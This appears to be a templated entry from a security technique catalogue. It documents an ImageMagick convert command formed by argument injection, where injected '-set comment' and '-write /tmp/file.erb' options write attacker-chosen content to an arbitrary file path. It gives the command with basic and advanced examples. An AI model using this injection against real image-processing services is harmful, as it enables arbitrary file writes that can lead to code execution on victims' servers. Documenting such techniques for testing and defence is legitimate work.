---
data: >-
  convert ORIGINAL_IMAGE -auto-orient -resize 123 -set comment MYCOMMENT -write
  /tmp/file.erb /tmp/image_processing20210328-23426-63rmm2.png
tags:
  - injection
  - imagemagick
type: command
executor: bash
platforms:
  - Linux
id: 80801a06-1ec2-44d3-b0ab-d605184a3bd1
created_at: '2025-12-14T17:28:28.325Z'
updated_at: '2025-12-14T17:28:28.325Z'
verified: false
validated: true
submitted: true
---
# convert-with-argument-injection

## Command

```bash
convert ORIGINAL_IMAGE -auto-orient -resize 123 -set comment MYCOMMENT -write /tmp/file.erb /tmp/image_processing20210328-23426-63rmm2.png
```

## Description

This ImageMagick convert command, generated via argument injection, processes an image with injected metadata and writes output to an arbitrary path, demonstrating file write exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ORIGINAL_IMAGE | Input image file | Yes |
| -auto-orient | Auto-orient the image | No |
| -resize 123 | Resize to 123 pixels | No |
| -set comment MYCOMMENT | Set metadata comment to MYCOMMENT | Yes |
| -write /tmp/file.erb | Write intermediate output to /tmp/file.erb | Yes |
| /tmp/image_processing... | Final output path | Yes |

## Examples

### Basic Usage

```bash
convert input.jpg -auto-orient -resize 100 -set comment TEST -write /tmp/test.erb output.png
```

### Advanced Usage

```bash
convert input.jpg -auto-orient -resize 123 -set comment MYCOMMENT -write /tmp/file.erb /tmp/output.png
```

## Expected Output

Processes the image, sets the comment metadata, and writes a file containing MYCOMMENT to /tmp/file.erb, followed by the final PNG output.

## Related

- [[Related Procedure]]
